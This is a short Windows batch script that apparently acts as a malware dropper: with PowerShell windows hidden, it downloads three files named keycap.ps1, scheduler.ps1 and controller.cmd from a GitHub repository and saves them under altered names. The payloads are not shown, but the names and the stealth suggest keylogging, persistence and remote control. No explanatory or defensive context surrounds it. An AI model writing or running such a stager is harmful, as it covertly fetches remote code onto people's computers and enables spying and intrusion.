@echo off

powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/keycap.ps1 -OutFile keycap.ps1"

powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/scheduler.ps1 -OutFile sduler.ps1"

powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/controller.cmd -OutFile coller.cmd"
